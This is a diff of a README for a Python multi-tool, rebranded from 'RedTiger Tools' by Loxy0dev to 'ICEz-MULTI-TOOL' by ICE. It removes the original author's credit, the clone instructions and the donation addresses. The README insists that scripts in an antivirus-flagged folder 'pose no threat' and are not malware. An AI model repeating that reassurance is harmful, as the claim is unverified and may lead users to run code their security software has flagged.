@@ -15,7 +15,7 @@
 
 <p>
   
-  - Developed in <strong>Python</strong>, by <a href="https://redtiger.shop/loxy0dev">Loxy0dev</a><br>
+  - Developed in <strong>Python</strong>, by ICE </a><br>
   - Tool in <strong>English</strong>.<br>
   - Available on <strong>Windows</strong> and <strong>Linux</strong>.<br>
   - <strong>No malware</strong> or <strong>backdoor</strong>.<br>
@@ -170,14 +170,6 @@
 2 - Unzip the folder.
 3 - Launch "Setup.bat" or "Setup.py".
 ```
-Or
-```
-1 - Open a terminal.
-2 - Write "git clone https://github.com/loxy0dev/RedTiger-Tools.git"
-3 - Write "cd RedTiger-Tools"
-4 - Write "git pull"
-5 - Write "python Setup.py"
-```
 <br><br>
 </p>
 
@@ -188,21 +180,7 @@ Or
   - RedTiger Tools has been developed solely for educational purposes.<br>
   - This project has been created with good intentions and is intended for personal use only.<br>
   - By choosing to use RedTiger, you acknowledge and accept full responsibility for any consequences that may result from your actions.<br>
-  - All scripts in the "<a href="https://github.com/loxy0dev/RedTiger-Tools/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
+  - All scripts in the "<a href="https://github.com/ice-developz01/ICEz-MULTI-TOOL/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
 <br><br>
 </p>
 
-<h1 align="center">Donation</h1>
-
-<p>
-  
-  <strong>Bitcoin Adress:</strong>
-  ``` 
-1MSRzopmhasr9ByHBrksScqv6wByVagDKe
-  ```
-  <strong>Litecoin Adress:</strong>
-  ```
-LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
-  ```
-
-</p>
